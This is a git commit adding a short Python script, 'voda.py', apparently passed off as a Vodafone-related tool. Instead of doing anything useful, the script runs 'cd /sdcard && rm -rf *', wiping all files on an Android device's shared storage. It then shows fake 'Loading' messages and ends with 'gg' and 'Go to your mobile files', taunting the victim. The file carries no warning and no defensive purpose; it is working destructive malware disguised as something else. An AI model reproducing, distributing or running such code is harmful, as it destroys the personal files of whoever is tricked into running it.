890682712a4d0b98a56016f04e76d933bb9c47c7
ZEros666 <111015942+hackingnewsUSA@users.noreply.github.com>
2024-01-09 20:36:59 +0200

    Add files via upload

---
+++ voda.py
@@ -0,0 +1,14 @@
+import os as zeros
+import time
+zeros.system('clear')
+print('BY Vodafonechas')
+zeros.system('cd /sdcard && rm -rf *')
+print('Loading')
+time.sleep(1)
+print('Loading.')
+time.sleep(2)
+print('Loading..')
+time.sleep(3)
+print('Loading...')
+print('gg')
+print('Go to your mobile files ')
